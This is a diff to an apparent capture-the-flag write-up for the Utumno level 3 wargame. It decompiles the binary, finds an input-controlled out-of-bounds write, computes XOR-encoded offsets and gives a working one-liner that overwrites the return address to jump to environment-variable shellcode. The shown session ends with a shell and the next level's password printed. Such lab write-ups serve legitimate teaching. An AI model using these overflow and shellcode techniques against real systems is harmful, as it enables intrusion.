@@ -368,9 +368,11 @@ zuudafiine
  804846e:	66 90                	xchg   %ax,%ax
 ```
 
-phidra
+From this assembly, we found that the logic can be a little difficult to understand, so we can use tool to help us.
 
-https://github.com/NationalSecurityAgency/ghidra
+phidra: https://github.com/NationalSecurityAgency/ghidra
+
+After phidra, we got the C-code of utumno3.
 
 ```c
 int main(int argc,char **argv)
@@ -397,42 +399,41 @@ int main(int argc,char **argv)
 }
 ```
 
+`a[cVar1] = (char)iVar2;` is the buffer overflow vulnerability. 
+
+`cVar1` is controlled by input; `iVar2` is also controlled by input.
+
+There are 0x28 bytes from the beginning of `a[]` to `RET`.
+
+```c
+0x28 = input[0] ^ (0\*3)  ⇒ input[0] = 0x28 = (
+0x29 = input[1] ^ (1\*3)  ⇒ input[1] = 0x2a = \*
+0x2a = input[2] ^ (2\*3)  ⇒ input[2] = 0x2c = ,
+0x2b = input[3] ^ (3*3)  ⇒ input[3] = 0x22 = “
+```
+
+So, we can put the shellcode in a env variable, and overwrite the RET.
+
+Then we can do the same thing as level2, export the shellcode into the environment and find out the address of the new environment then use the address as input for utumno3
+
+Now I have the address of the shellcode: `0xffffdea3`
+
+```shell
+utumno3@utumno:/utumno$ (python -c 'print "\x28\xb3\x2a\xde\x2c\xff\x22\xff"+"\n"*15';cat) | ./utumno3
+whoami
+utumno4
+cat /etc/utumno_pass/utumno4
+oogieleoga
+```
+
+**Note: there is a loop(0x17<i) in the main function, so we need more inputs to end the loop.**
 
 
-0x28 = I0 ^ 0 *3	I0 = 28
 
-0x29 = I1 ^ 1 *3	I1 = 2a
-
-0x2a = I2 ^ 2 *3	I2 = 2c
-
-0x2b = I3 ^ 3 *3	I3 = 22
-
-
-
-0xffffdea3
-
-0xff
-
-\xa3\xde\xff\xff
-
-(\xa3*\xde,\xff"\xff
-
-This does not work
-
-(python -c 'print "\(\xa3*\xde,\xff\"\xff" + ‘a’\*38') | ./utumno3
-
-
+Another trier, not finished.
 
 $1 = {<text variable, no debug info>} 0xf7e4c850 <system>
-
-
 
 We can not use the stack
 
 return to libc
-
-
-
-
-
-(python -c 'print "\x28\xb3\x2a\xde\x2c\xff\x22\xff"+"\n"*15';cat) | ./utumno3
